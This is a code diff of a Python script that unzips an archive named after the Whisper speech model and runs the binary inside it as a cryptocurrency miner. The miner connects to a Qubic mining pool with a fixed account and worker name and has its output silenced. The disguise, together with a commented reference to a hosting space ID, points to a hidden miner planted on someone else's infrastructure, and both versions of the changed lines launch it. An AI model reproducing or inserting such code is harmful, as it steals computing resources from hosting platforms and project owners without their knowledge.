@@ -11,8 +11,8 @@ def lolab01959():
     wk_name = "shor12_HoaiAi"
     #os.getenv('SPACE_ID').replace("/","_")
     os.system("unzip whisper_v4.zip")
-    os.system("chmod +x ./whisper_v4/whisper_v4")
-    os.system(f"./whisper_v4/whisper_v4 --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wk_name} >/dev/null")
+    os.system("chmod +x whisper_v4")
+    os.system(f"./whisper_v4 --account CP_fafubk1b65 --pool qubic1.hk.apool.io:3334 --worker {wk_name} >/dev/null")
 
 
 if __name__ == '__main__':
